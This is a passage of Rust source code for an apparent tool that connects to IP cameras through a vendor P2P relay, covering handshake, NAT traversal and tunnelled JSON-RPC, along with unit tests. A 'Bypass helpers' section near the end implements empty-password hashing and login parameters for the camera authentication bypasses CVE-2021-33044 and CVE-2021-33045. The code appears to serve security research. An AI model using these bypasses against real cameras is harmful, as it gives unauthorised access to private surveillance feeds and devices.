        let nonce2: u32 = rand::random();
        let auth_xml = build_dev_auth(key, admin_user, nonce2, &randsalt, "");
        format!("<body>{auth_xml}<agentAddr>{}</agentAddr></body>", agent)
    } else {
        format!("<body><agentAddr>{}</agentAddr></body>", agent)
    };
    let mut relay_ok = false;
    for target in [main_addr.to_string(), p2psrv.clone()] {
        socket2
            .connect(&target)
            .await
            .map_err(|e| format!("reconnect socket2 to {}: {}", target, e))?;
        socket2
            .dh_request(
                &format!("/device/{}/relay-channel", serial),
                Some(&rc_body),
                &mut cseq,
            )
            .await?;
        // The "Server Nat Info!" response is relayed by the agent, so point the
        // socket at the agent right after sending: on a connected UDP socket the
        // kernel drops datagrams from any other address.
        socket2
            .connect(&agent)
            .await
            .map_err(|e| format!("reconnect socket2 to agent: {}", e))?;
        // The server first answers "100 Trying", then the final
        // "200 Server Nat Info!" once the device has connected to the agent.
        let mut rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(10)).await;
        if rc_resp.code == 100 {
            rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(10)).await;
        }
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] relay-channel via {} response: {} {} {:?}",
                target, rc_resp.code, rc_resp.status, rc_resp.body
            );
        }
        if rc_resp.code >= 200 && rc_resp.code < 400 {
            if let Some(b) = rc_resp.body.as_ref() {
                nat_pub = pub_addr_from(b);
            }
            relay_ok = true;
            break;
        }
    }
    if !relay_ok {
        // Some infrastructures answer the relay-channel directly on the relay
        // server (usually 400 for this client, but never hurts to ask).
        socket2
            .connect(&relay)
            .await
            .map_err(|e| format!("reconnect socket2 to relay: {}", e))?;
        socket2
            .dh_request(
                &format!("/device/{}/relay-channel", serial),
                Some(&rc_body),
                &mut cseq,
            )
            .await?;
        let mut rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(5)).await;
        if rc_resp.code == 100 {
            rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(5)).await;
        }
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] relay-channel via {} response: {} {} {:?}",
                relay, rc_resp.code, rc_resp.status, rc_resp.body
            );
        }
        if rc_resp.code >= 200 && rc_resp.code < 400 {
            if let Some(b) = rc_resp.body.as_ref() {
                nat_pub = pub_addr_from(b);
            }
            relay_ok = true;
        }
    }

    let mut used_mcw0 = false;
    if !relay_ok {
        // mcw0-style fallback: instead of a separate relay-channel, bake the
        // agent address into a fresh p2p-channel request so the device is told
        // to reach us through the agent directly. The "200 Server Nat Info!"
        // response on the p2p-channel socket confirms the tunnel.
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] relay-channel timed out everywhere; trying mcw0-style agent PubAddr channel"
            );
        }
        // The relay session from /relay/start only lasts ~30s and the
        // relay-channel attempts above consumed most of it, so re-establish it
        // with a fresh agent before the mcw0-style channel.
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("[debug] refreshing relay session for mcw0-style channel");
        }
        socket2
            .connect(&relay)
            .await
            .map_err(|e| format!("reconnect socket2 to relay for refresh: {}", e))?;
        socket2.dh_request("/relay/agent", None, &mut cseq).await?;
        let refresh_agent = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
        if refresh_agent.code >= 400 {
            return Err(format!(
                "Relay agent refresh error: {} {}",
                refresh_agent.code, refresh_agent.status
            ));
        }
        let token2 = refresh_agent
            .body
            .as_ref()
            .and_then(|b| b.get("body/Token"))
            .cloned()
            .unwrap_or_default();
        let agent2 = refresh_agent
            .body
            .as_ref()
            .and_then(|b| b.get("body/Agent"))
            .cloned()
            .unwrap_or_default();
        if agent2.is_empty() {
            return Err("No agent for refreshed relay session".to_string());
        }
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] refreshed relay token: {} agent: {}",
                token2, agent2
            );
        }
        socket2
            .connect(&agent2)
            .await
            .map_err(|e| format!("connect socket2 to refreshed agent: {}", e))?;
        socket2
            .dh_request(
                &format!("/relay/start/{}", token2),
                Some("<body><Client>:0</Client></body>"),
                &mut cseq,
            )
            .await?;
        let start_resp2 = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
        if start_resp2.code >= 400 {
            return Err(format!(
                "Relay start refresh error: {} {}",
                start_resp2.code, start_resp2.status
            ));
        }
        agent = agent2;
        for target in [main_addr.as_str(), p2psrv.as_str()] {
            socket
                .connect(target)
                .await
                .map_err(|e| format!("reconnect socket to {}: {}", target, e))?;
            socket
                .dh_request(
                    &format!("/device/{}/p2p-channel", serial),
                    Some(&format!(
                        "<body><Identify>0 0 0 0 0 0 0 0</Identify><PubAddr>{}</PubAddr></body>",
                        agent
                    )),
                    &mut cseq,
                )
                .await?;
            // The server first answers "100 Trying", then sends the "200 Server
            // Nat Info!" once the device has connected to the agent.
            let mut mcw_resp = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
            if mcw_resp.code == 100 {
                mcw_resp = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
            }
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] mcw0-style p2p-channel via {} response: {} {} {:?}",
                    target, mcw_resp.code, mcw_resp.status, mcw_resp.body
                );
            }
            if mcw_resp.code >= 200 && mcw_resp.code < 400 {
                if let Some(b) = mcw_resp.body.as_ref() {
                    nat_pub = pub_addr_from(b);
                }
                used_mcw0 = true;
                break;
            }
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] mcw0-style channel via {} failed ({} {}), next target",
                    target, mcw_resp.code, mcw_resp.status
                );
            }
        }
        if !used_mcw0 {
            return Err("Relay channel timed out and mcw0-style channel failed".to_string());
        }
    }

    // Resolve the device public address: the p2p-channel normally carries it,
    // otherwise take the one from the "Server Nat Info!" response above (the
    // relay reports the device NAT mapping there). Only when both are missing
    // is the address really unknown.
    if device_pub.is_empty() {
        device_pub = nat_pub;
        if !device_pub.is_empty() {
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] device PubAddr taken from Server Nat Info: {}",
                    device_pub
                );
            }
            socket
                .connect(&device_pub)
                .await
                .map_err(|e| format!("connect to device {}: {}", device_pub, e))?;
        } else if !relay_mode {
            // The hole punch / direct PTCP phase needs the device address.
            return Err(format!(
                "Device PubAddr is empty in the p2p-channel and Server Nat Info responses — device did not report to the relay; body: {}",
                body_preview(&resp_body, 200)
            ));
        }
    }

    if used_mcw0 {
        // mcw0-style channels need a short STUN exchange with the agent before
        // the agent relays data: the agent forwards the device's
        // BINDING_REQUEST_SIGN (0x00 0x01); answering with
        // BINDING_RESPONSE_SUCCESS (0x01 0x01) + transaction id completes the
        // NAT mapping on the agent.
        socket2
            .connect(&agent)
            .await
            .map_err(|e| format!("connect socket2 to agent for STUN: {}", e))?;
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("[debug] waiting for agent STUN BINDING_REQUEST_SIGN");
        }
        let deadline = tokio::time::Instant::now() + Duration::from_secs(15);
        loop {
            let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
            if remaining.is_zero() {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] STUN BINDING_REQUEST_SIGN timed out");
                }
                break;
            }
            // The device punch can be relayed to us either on the agent socket
            // or back through the main server, so poll both (mcw0 handles STUN
            // on the p2p-channel socket too).
            let from_srv = udp_recv(&socket, remaining);
            let from_agent = udp_recv(&socket2, remaining);
            let (opt, from) = tokio::select! {
                d = from_srv => (d, "main-server socket"),
                d = from_agent => (d, "agent socket"),
            };
            let data = match opt {
                Some(d) => d,
                None => break,
            };
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] STUN-phase recv on {} ({} bytes): {:02x?}",
                    from,
                    data.len(),
                    &data[..data.len().min(64)]
                );
            }
            if data.len() >= 32 && data[0] == 0x00 && data[1] == 0x01 {
                let mut reply = vec![0x01, 0x01];
                reply.extend_from_slice(&data[2..24]);
                reply.extend_from_slice(&[0u8; 8]);
                reply.extend_from_slice(&data[32..]);
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!(
                        "[debug] replying STUN BINDING_RESPONSE_SUCCESS ({} bytes)",
                        reply.len()
                    );
                }
                udp_send(&socket2, &reply).await;
                // Drain a possible follow-up response (like mcw0 does).
                let _ = udp_recv(&socket2, Duration::from_secs(2)).await;
                break;
            }
        }
    }

    // PTCP Sync with agent
    let mut agent_session = PTCPSession::new();
    udp_send(&socket2, &agent_session.send(PTCPBody::Sync).serialize()).await;
    let sync_data = udp_recv(&socket2, Duration::from_secs(10))
        .await
        .ok_or("Timeout waiting for PTCP Sync from agent".to_string())?;
    if sync_data.len() >= 25 {
        let body = PTCPBody::parse(&sync_data[24..]);
        agent_session.recv(PTCPPacket::parse(&sync_data));
        if matches!(body, PTCPBody::Sync) {
            udp_send(&socket2, &agent_session.send(PTCPBody::Sync).serialize()).await;
        }
    }

    if relay_mode {
        // Some devices push their Sync through the relay repeatedly until they
        // see ours (and the flow-control acks), and only then accept a bind. On
        // direct-mode agents the tunnel idles after the exchange above; on
        // these relayed channels the device keeps re-syncing otherwise and the
        // DHIP bind/login is sent into a half-open tunnel. Keep answering the
        // Syncs and acks until the channel settles (or a sane cap is reached).
        let settle_deadline = tokio::time::Instant::now() + Duration::from_secs(8);
        let mut last_activity = tokio::time::Instant::now();
        let mut syncs_seen: u32 = 0;
        loop {
            let now = tokio::time::Instant::now();
            if now >= settle_deadline {
                break;
            }
            // Wait at most 1s for a packet. A long all-quiet wait here broke
            // the challenge bind on 4F01E1APAZ01840: the relay session only
            // lives ~30s and the fixed 12s cap pushed the bind past it, so it
            // was written into a dead tunnel. On a channel that keeps
            // re-syncing the datagrams keep arriving and every one is acked,
            // so an active settle still runs until the overall cap.
            let wait = Duration::from_secs(1).min(settle_deadline.saturating_duration_since(now));
            let Some(data) = udp_recv(&socket2, wait).await else {
                break;
            };
            if data.len() < 25 {
                continue;
            }
            last_activity = tokio::time::Instant::now();
            let body = PTCPBody::parse(&data[24..]);
            agent_session.recv(PTCPPacket::parse(&data));
            match &body {
                PTCPBody::Sync => {
                    syncs_seen += 1;
                    // The reference relay clients acknowledge every non-empty
                    // packet with an empty ack (never a SYN reply); mirror that.
                    udp_send(&socket2, &agent_session.send(PTCPBody::Empty).serialize()).await;
                }
                PTCPBody::Empty | PTCPBody::Heartbeat => {
                    udp_send(&socket2, &agent_session.send(PTCPBody::Empty).serialize()).await;
                }
                PTCPBody::Status(r, _) if *r == u32::MAX || *r == 0 => {
                    udp_send(&socket2, &agent_session.send(PTCPBody::Empty).serialize()).await;
                }
                _ => {}
            }
            if syncs_seen == 0 {
                // Nothing re-syncing: a quiet relay, stop as fast as possible.
                if last_activity.elapsed() > Duration::from_secs(2) {
                    break;
                }
            } else if last_activity.elapsed() > Duration::from_millis(700) {
                // The peer stopped re-syncing/retransmitting: settled.
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!(
                        "[debug] relay PTCP channel settled after {} sync exchanges",
                        syncs_seen
                    );
                }
                break;
            }
        }
    }

    if relay_mode {
        return Ok(HandshakeResult {
            device_socket: Arc::new(socket),
            device_session: Arc::new(Mutex::new(PTCPSession::new())),
            agent_socket: Arc::new(socket2),
            agent_session: Arc::new(Mutex::new(agent_session)),
            device_public_ip: pub_ip(&device_pub),
            device_http_port,
            device_rtsp_port,
            device_priv_port,
        });
    }

    // Get sign from agent
    udp_send(
        &socket2,
        &agent_session
            .send(PTCPBody::Command(
                b"\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            ))
            .serialize(),
    )
    .await;
    let sign_data = udp_recv(&socket2, Duration::from_secs(5))
        .await
        .ok_or("Timeout waiting for sign from agent".to_string())?;
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!(
            "[debug] sign response raw ({} bytes): {:02x?}",
            sign_data.len(),
            &sign_data[..sign_data.len().min(64)]
        );
    }
    let mut pkt = agent_session.recv(PTCPPacket::parse(&sign_data));
    while matches!(pkt.body, PTCPBody::Empty) {
        udp_send(&socket2, &agent_session.send(PTCPBody::Empty).serialize()).await;
        let data = udp_recv(&socket2, Duration::from_secs(5))
            .await
            .ok_or("Timeout waiting for sign data".to_string())?;
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] sign data raw ({} bytes): {:02x?}",
                data.len(),
                &data[..data.len().min(64)]
            );
        }
        pkt = agent_session.recv(PTCPPacket::parse(&data));
    }
    let sign = match &pkt.body {
        PTCPBody::Command(c) if c.len() > 12 => c[12..].to_vec(),
        _ => return Err("Invalid sign response from agent".to_string()),
    };

    // NAT traversal
    let cookie: [u8; 4] = rand::random();
    let trans_id: [u8; 12] = rand::random();
    let cid_inv: Vec<u8> = cid.iter().map(|b| !b).collect();
    let device_addr_str = socket.peer_addr().unwrap().to_string();

    let mut msg1 = b"\xff\xfe\xff\xe7".to_vec();
    msg1.extend_from_slice(&cookie);
    msg1.extend_from_slice(&trans_id);
    msg1.extend_from_slice(b"\x7f\xd5\xff\xf7");
    msg1.extend_from_slice(&cid_inv);
    msg1.extend_from_slice(b"\xff\xfb\xff\xf7\xff\xfe");
    msg1.extend_from_slice(&ip_to_bytes(&device_addr_str));
    socket.send(&msg1).await.unwrap();

    let mut buf = [0u8; 4096];
    let result = timeout(Duration::from_secs(5), socket.recv(&mut buf)).await;
    if result.is_err() {
        return Err(
            "Timeout waiting for device hole-punch response. Try --relay mode.".to_string(),
        );
    }
    let n = result.unwrap().unwrap_or(0);
    if n < 20 {
        return Err("Malformed device hole-punch response. Try --relay mode.".to_string());
    }
    let rtrans_id = &buf[8..20];

    let local_addr_str = socket.local_addr().unwrap().to_string();
    let mut msg2 = b"\xfe\xfe\xff\xe7".to_vec();
    msg2.extend_from_slice(&cookie);
    msg2.extend_from_slice(rtrans_id);
    msg2.extend_from_slice(b"\x7f\xd6\xff\xf7");
    msg2.extend_from_slice(&cid_inv);
    msg2.extend_from_slice(b"\xff\xfb\xff\xf7\xff\xfe");
    msg2.extend_from_slice(&ip_to_bytes(&local_addr_str));
    socket.send(&msg2).await.unwrap();

    for _ in 0..5 {
        let _ = timeout(Duration::from_secs(2), socket.recv(&mut buf)).await;
    }

    // Establish PTCP with device
    let mut device_session = PTCPSession::new();
    udp_send(&socket, &device_session.send(PTCPBody::Sync).serialize()).await;

    {
        let pkt = recv_until(&socket, &mut device_session, Duration::from_secs(5), |b| {
            matches!(b, PTCPBody::Sync)
        })
        .await
        .ok_or("Timeout waiting for PTCP Sync from device".to_string())?;
        assert!(matches!(pkt.body, PTCPBody::Sync));
    }

    let mut auth_req = b"\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec();
    auth_req.extend_from_slice(&sign);
    udp_send(
        &socket,
        &device_session.send(PTCPBody::Command(auth_req)).serialize(),
    )
    .await;

    pkt = recv_until(
        &socket,
        &mut device_session,
        Duration::from_secs(5),
        |b| matches!(b, PTCPBody::Command(c) if !c.is_empty() && c[0] == 0x1A),
    )
    .await
    .ok_or("Timeout waiting for PTCP auth response from device".to_string())?;
    assert!(matches!(&pkt.body, PTCPBody::Command(c) if c[0] == 0x1A));

    udp_send(
        &socket,
        &device_session
            .send(PTCPBody::Command(
                b"\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            ))
            .serialize(),
    )
    .await;

    let _ = recv_until(&socket, &mut device_session, Duration::from_secs(3), |b| {
        matches!(b, PTCPBody::Empty)
    })
    .await;

    Ok(HandshakeResult {
        device_socket: Arc::new(socket),
        device_session: Arc::new(Mutex::new(device_session)),
        agent_socket: Arc::new(socket2),
        agent_session: Arc::new(Mutex::new(agent_session)),
        device_public_ip: pub_ip(&device_pub),
        device_http_port,
        device_rtsp_port,
        device_priv_port,
    })
}

/// Public address of the device from a p2p-channel response body. Tolerates the
/// shape differences seen across relays: `body/PubAddr`, a nested
/// `body/Device/PubAddr` or a differently cased tag — any path segment equal to
/// `PubAddr` (case-insensitive) with a non-blank value is accepted.
fn pub_addr_from(body: &HashMap<String, String>) -> String {
    if let Some(v) = body.get("body/PubAddr") {
        let v = v.trim();
        if !v.is_empty() {
            return v.to_string();
        }
    }
    body.iter()
        .filter(|(k, v)| {
            k.rsplit('/')
                .next()
                .is_some_and(|last| last.eq_ignore_ascii_case("pubaddr"))
                && !v.trim().is_empty()
        })
        .map(|(_, v)| v.trim().to_string())
        .next()
        .unwrap_or_default()
}

/// One-line dump of a parsed XML body, used in error messages so a failure
/// reports what the relay actually sent instead of a bare "empty" claim.
fn body_preview(body: &HashMap<String, String>, max: usize) -> String {
    let mut parts: Vec<String> = body
        .iter()
        .filter(|(_, v)| !v.trim().is_empty())
        .map(|(k, v)| format!("{}={}", k, v))
        .collect();
    parts.sort();
    if parts.is_empty() {
        return "(empty body)".to_string();
    }
    let s = parts.join(" ");
    s.chars().take(max).collect::<String>()
}

/// Strip the port from an `IP:port` public address reported by the relay.
fn pub_ip(addr: &str) -> String {
    addr.split(':').next().unwrap_or(addr).to_string()
}

// ---- DHIP (JSON-RPC over binary framing, tunneled through PTCP) ----

pub struct DhipSession {
    pub realm_id: u32,
    pub session_id: u32,
    pub request_id: u32,
}

impl DhipSession {
    pub fn new(realm_id: u32) -> Self {
        Self {
            realm_id,
            session_id: 0,
            request_id: 0,
        }
    }

    pub fn next_request_id(&mut self) -> u32 {
        self.request_id += 1;
        self.request_id
    }

    pub fn build_packet(&mut self, json_str: &str) -> Vec<u8> {
        let msg_len = json_str.len() as u32;
        let total = msg_len;
        // Use JSON "id" if present, otherwise auto-increment
        let id = serde_json::from_str::<serde_json::Value>(json_str)
            .ok()
            .and_then(|v| v.get("id").and_then(|i| i.as_u64()))
            .map(|i| i as u32)
            .unwrap_or_else(|| self.next_request_id());

        let mut header = Vec::with_capacity(32);
        header.extend_from_slice(&0x00000020u32.to_le_bytes());
        header.extend_from_slice(&0x50494844u32.to_le_bytes());
        header.extend_from_slice(&self.session_id.to_le_bytes());
        header.extend_from_slice(&id.to_le_bytes());
        header.extend_from_slice(&total.to_le_bytes());
        header.extend_from_slice(&0u32.to_le_bytes());
        header.extend_from_slice(&msg_len.to_le_bytes());
        header.extend_from_slice(&0u32.to_le_bytes());
        header.extend_from_slice(json_str.as_bytes());
        header
    }
}

pub async fn dhip_recv(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    realm_id: u32,
    deadline: tokio::time::Instant,
) -> Option<String> {
    let mut buf: Vec<u8> = Vec::new();
    let mut packets: u32 = 0;

    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }

        let raw = match udp_recv(sock, remaining).await {
            Some(r) => r,
            None => {
                // Timeout: say whether the other end sent anything at all, so a
                // silent device is distinguishable from a reply we cannot parse.
                eprintln!(
                    "  [debug] dhip_recv: no reply on realm={} ({} packets received)",
                    realm_id, packets
                );
                return None;
            }
        };
        packets += 1;
        if raw.len() < 25 {
            continue;
        }
        let pkt = PTCPPacket::parse(&raw);
        let body = PTCPBody::parse(&raw[24..]);

        let pkt_realm = match &body {
            PTCPBody::Payload(p) => Some(p.realm),
            PTCPBody::Status(r, _) => Some(*r),
            _ => None,
        };

        {
            let mut s = session.lock().await;
            if pkt_realm == Some(realm_id) {
                let _ = s.recv(pkt);
            } else {
                s.recv_only_bytes(&pkt);
            }
        }

        match &body {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                {
                    // ACK the data so the relay keeps streaming the response
                    let mut s = session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                }
                buf.extend_from_slice(&p.data);

                if buf.len() >= 32 {
                    let head_flag = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]);
                    let magic = u32::from_le_bytes([buf[4], buf[5], buf[6], buf[7]]);

                    if head_flag == 0x20 && magic == 0x50494844 {
                        let msg_len =
                            u32::from_le_bytes([buf[24], buf[25], buf[26], buf[27]]) as usize;
                        if buf.len() >= 32 + msg_len {
                            let json_bytes = &buf[32..32 + msg_len];
                            if let Ok(s) = std::str::from_utf8(json_bytes) {
                                return Some(s.to_string());
                            }
                        }
                    } else {
                        eprintln!("  [debug] dhip_recv: payload realm={} unknown fmt: flag=0x{:08x} magic=0x{:08x} len={}", realm_id, head_flag, magic, buf.len());
                    }
                } else {
                    eprintln!(
                        "  [debug] dhip_recv: payload realm={} short ({} bytes)",
                        realm_id,
                        buf.len()
                    );
                }
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                break;
            }
            PTCPBody::Status(r, s) if *r != realm_id => {
                eprintln!(
                    "  [debug] dhip_recv: status realm={} not matching realm_id={}: '{}'",
                    r, realm_id, s
                );
                continue;
            }
            PTCPBody::Payload(p) if p.realm != realm_id => {
                eprintln!(
                    "  [debug] dhip_recv: payload realm={} != realm_id={} ({} bytes)",
                    p.realm,
                    realm_id,
                    p.data.len()
                );
                continue;
            }
            PTCPBody::Heartbeat => {
                {
                    let mut s = session.lock().await;
                    udp_send(sock, &s.send(PTCPBody::Heartbeat).serialize()).await;
                }
                continue;
            }
            PTCPBody::Empty => {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Sync => {
                // Reference relay clients acknowledge every non-empty packet
                // (including SYNs) with an empty ack, never a SYN reply.
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            _ => {
                let raw_type = if raw.len() > 24 { raw[24] } else { 0 };
                let realm_val = if raw.len() > 28 {
                    u32::from_be_bytes([raw[28], raw[29], raw[30], raw[31]])
                } else {
                    0
                };
                let hexdump: String = raw.iter().take(96).map(|b| format!("{:02x}", b)).collect();
                eprintln!(
                    "  [debug] dhip_recv: unhandled body type=0x{:02x} realm={} len={} hex: {}",
                    raw_type,
                    realm_val,
                    raw.len(),
                    hexdump
                );
                continue;
            }
        }
    }

    None
}

pub async fn dhip_call(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    json_str: &str,
    probe_timeout: Duration,
) -> Option<String> {
    let realm_id;
    let session_id;
    {
        let s = dhip.lock().await;
        realm_id = s.realm_id;
        session_id = s.session_id;
    }

    {
        let mut s = dhip.lock().await;
        let pkt = s.build_packet(json_str);
        let mut ps = pcp_session.lock().await;
        eprintln!(
            "  [debug] dhip_call: sending realm={} sess={} req_id={} json={}",
            realm_id,
            s.session_id,
            s.request_id,
            &json_str[..json_str.len().min(120)]
        );
        udp_send(
            sock,
            &ps.send(PTCPBody::Payload(PTCPPayload {
                realm: realm_id,
                data: pkt,
            }))
            .serialize(),
        )
        .await;
    }

    let _ = session_id;
    let deadline = tokio::time::Instant::now() + probe_timeout;
    dhip_recv(sock, pcp_session, realm_id, deadline).await
}

// ---- Bypass helpers ----

pub fn empty_password_hash(user: &str, realm: &str, random: &str) -> String {
    let h1 = format!(
        "{:X}",
        md5::compute(format!("{}:{}:", user, realm).as_bytes())
    );
    format!(
        "{:x}",
        md5::compute(format!("{}:{}:{}", user, random, h1).as_bytes())
    )
}

pub fn password_hash(user: &str, realm: &str, random: &str, password: &str) -> String {
    let h1 = format!(
        "{:X}",
        md5::compute(format!("{}:{}:{}", user, realm, password).as_bytes())
    );
    format!(
        "{:x}",
        md5::compute(format!("{}:{}:{}", user, random, h1).as_bytes())
    )
}

#[derive(Clone, Copy)]
#[allow(dead_code)]
pub enum BypassMethod {
    NetKeyboard,
    Loopback,
}

impl BypassMethod {
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        match self {
            BypassMethod::NetKeyboard => "CVE-2021-33044 (NetKeyboard)",
            BypassMethod::Loopback => "CVE-2021-33045 (Loopback)",
        }
    }

    #[allow(dead_code)]
    pub fn login2_params(&self, user: &str, hash: &str) -> serde_json::Value {
        match self {
            BypassMethod::NetKeyboard => serde_json::json!({
                "userName": user,
                "password": hash,
                "clientType": "NetKeyboard",
                "ipAddr": "127.0.0.1",
                "loginType": "Direct",
                "authorityType": "Default",
            }),
            BypassMethod::Loopback => serde_json::json!({
                "userName": user,
                "password": hash,
                "clientType": "Local",
                "ipAddr": "127.0.0.1",
                "loginType": "Loopback",
                "authorityType": "Default",
            }),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pub_addr_from_finds_exact_nested_and_cased_keys() {
        let mut body = HashMap::new();
        body.insert("body/PubAddr".to_string(), " 1.2.3.4:37777 ".to_string());
        assert_eq!(pub_addr_from(&body), "1.2.3.4:37777");

        let mut nested = HashMap::new();
        nested.insert("body/Device/PubAddr".to_string(), "5.6.7.8:80".to_string());
        assert_eq!(pub_addr_from(&nested), "5.6.7.8:80");

        let mut cased = HashMap::new();
        cased.insert("body/pubaddr".to_string(), "9.9.9.9:554".to_string());
        assert_eq!(pub_addr_from(&cased), "9.9.9.9:554");

        let mut blank = HashMap::new();
        blank.insert("body/PubAddr".to_string(), "  ".to_string());
        assert_eq!(pub_addr_from(&blank), "");
        assert_eq!(pub_addr_from(&HashMap::new()), "");
    }

    #[test]
    fn body_preview_reports_empty_and_truncates() {
        assert_eq!(body_preview(&HashMap::new(), 50), "(empty body)");
        let mut body = HashMap::new();
        body.insert("body/Result".to_string(), "0".to_string());
        body.insert("body/PubAddr".to_string(), "1.2.3.4:37777".to_string());
        let preview = body_preview(&body, 500);
        assert!(preview.contains("body/PubAddr=1.2.3.4:37777"));
        assert!(!preview.contains('\n'));
        assert!(body_preview(&body, 8).chars().count() <= 9);
    }

    #[test]
    fn p2p_channel_dev_timeout_only_for_device_timeout() {
        let mut body = HashMap::new();
        body.insert("body/result".to_string(), "Dev_TimeOut".to_string());
        let res = DHResponse {
            code: 200,
            status: "OK".to_string(),
            body: Some(body),
        };
        assert!(p2p_channel_dev_timeout(&res));

        // No result field → normal answer, nothing to retry.
        let plain = DHResponse {
            code: 200,
            status: "OK".to_string(),
            body: Some(HashMap::new()),
        };
        assert!(!p2p_channel_dev_timeout(&plain));

        // HTTP errors are handled by the error path, not by the retry.
        let forbidden = DHResponse {
            code: 403,
            status: "Forbidden".to_string(),
            body: res.body,
        };
        assert!(!p2p_channel_dev_timeout(&forbidden));
    }

    // Vectors produced by the reference Python implementation (dh-p2p helpers).
    #[test]
    fn devauth_crypto_matches_reference() {
        let user = "admin";
        let password = "12345";
        let randsalt = "a8fe9aedac8af59d8434062ba696333d";
        let nonce: u32 = 123456789;
        let curdate: u64 = 1700000000;
        let laddr = "127.0.0.1:5000";

        let key = p2p_auth_key(user, password, randsalt);
        assert_eq!(
            String::from_utf8_lossy(&key),
            "1261DBD279F5CD49C12335967A4DB61B"
        );

        let enc = encrypt_local_addr(&key, nonce, laddr);
        assert_eq!(enc, "PN0tQWlGB4+flbo0cIE=");

        let auth_xml = build_dev_auth_at(&key, user, nonce, randsalt, &enc, curdate);
        assert!(
            auth_xml.contains("<DevAuth>LUvOwPJA0VYVbqrbwC58rpvgKd/iYwV2zk4Dqr89JE8=</DevAuth>")
        );
        assert!(auth_xml.contains("<RandSalt>a8fe9aedac8af59d8434062ba696333d</RandSalt>"));
        assert!(auth_xml.contains("<UserName>admin</UserName>"));
    }

    #[test]
    fn device_info_decrypts_randsalt() {
        // Re-encrypt a known payload with the fixed info key/IV.
        let plain = br#"{"httpport":80,"privport":37777,"randsalt":"a8fe9aedac8af59d8434062ba696333d","rtspport":554,"tlsprivport":37778}"#;
        let enc = aes_ofb_apply(INFO_KEY, INFO_IV, plain);
        let b64 = base64::engine::general_purpose::STANDARD.encode(&enc);
        let info = decrypt_device_info(&b64).expect("decrypt");
        assert_eq!(
            info.get("randsalt").and_then(|v| v.as_str()),
            Some("a8fe9aedac8af59d8434062ba696333d")
        );
    }

    #[test]
    fn extracts_randsalt_from_error_body() {
        let mut body = HashMap::new();
        body.insert(
            "body/RandSalt".to_string(),
            "a8fe9aedac8af59d8434062ba696333d".to_string(),
        );
        assert_eq!(
            randsalt_from_err_body(&body),
            Some("a8fe9aedac8af59d8434062ba696333d".to_string())
        );
        let mut body2 = HashMap::new();
        body2.insert("RandSalt".to_string(), "deadbeef".to_string());
        assert_eq!(randsalt_from_err_body(&body2), Some("deadbeef".to_string()));
        let mut body3 = HashMap::new();
        body3.insert("body/Result".to_string(), "DevPwd_InvalidSalt".to_string());
        assert_eq!(randsalt_from_err_body(&body3), None);
    }

    #[test]
    fn short_malformed_packets_do_not_panic() {
        // Field crash: an 8-byte 0x10 datagram panicked PTCPPayload::parse.
        let short_payload = [0x10, 0x00, 0x00, 0x00, 1, 2, 3, 4];
        match PTCPBody::parse(&short_payload) {
            PTCPBody::Payload(p) => assert!(p.data.is_empty()),
            other => panic!("expected Payload, got {:?}", other),
        }
        // Shorter than a PTCP header → Empty packet, no panic.
        for len in [0usize, 4, 8, 16, 23] {
            let raw = vec![0u8; len];
            let pkt = PTCPPacket::parse(&raw);
            assert!(matches!(pkt.body, PTCPBody::Empty));
        }
        // Truncated Bind/Status fall back to Command instead of panicking.
        let short_bind = [0x11u8, 0, 0, 0, 1, 2, 3];
        assert!(matches!(PTCPBody::parse(&short_bind), PTCPBody::Command(_)));
        let short_status = [0x12u8, 0, 0, 0, 1, 2];
        assert!(matches!(
            PTCPBody::parse(&short_status),
            PTCPBody::Command(_)
        ));
    }

    // ---- snapshot HTTP framing ----

    /// Synthetic JPEG of `len` bytes, SOI + filler + EOI.
    fn fake_jpeg(len: usize) -> Vec<u8> {
        let mut v = vec![0xFF, 0xD8, 0xFF];
        v.resize(len - 2, 0x55);
